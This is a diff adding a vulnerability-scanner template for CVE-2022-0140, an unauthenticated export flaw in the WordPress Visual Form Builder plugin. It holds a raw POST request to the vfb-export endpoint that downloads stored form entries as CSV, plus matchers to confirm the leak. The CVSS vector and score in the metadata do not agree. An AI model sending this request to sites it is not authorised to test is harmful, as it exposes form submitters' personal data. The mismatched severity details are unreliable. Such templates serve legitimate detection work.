@@ -1,0 +1,39 @@
+id: wordpress-visual-form-builder-vfb-export
+info:
+  name: WordPress Visual Form Builder Plugin vfb-export Unauthorized Access Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The WordPress Visual Form Builder plugin before 3.0.6 contains an unauthorized access vulnerability that allows unauthenticated users to view form entries or export them as CSV files using the vfb export endpoint.
+  reference:
+    - https://wpscan.com/vulnerability/9fa2b3b6-2fe3-40f0-8f71-371dd58fe336
+  classification:
+    cve-id: CVE-2022-0140
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 7.2
+
+http:
+  - raw:
+      - |
+        POST /wp-admin/admin.php?page=vfb-export HTTP/1.1
+        Host: {{Hostname}}
+        Referer: {{BaseURL}}/wp-admin/admin.php?page=vfb-export
+        Content-Type: application/x-www-form-urlencoded
+        Origin: {{BaseURL}}
+        Content-Length: 127
+
+        vfb-content=entries&format=csv&entries_form_id=1&entries_start_date=0&entries_end_date=0&submit=Download+Export+File
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Date Submitted"
+          - "IP Address"
+      - type: word
+        part: header
+        words:
+          - ".csv"
+      - type: status
+        status:
+          - 200
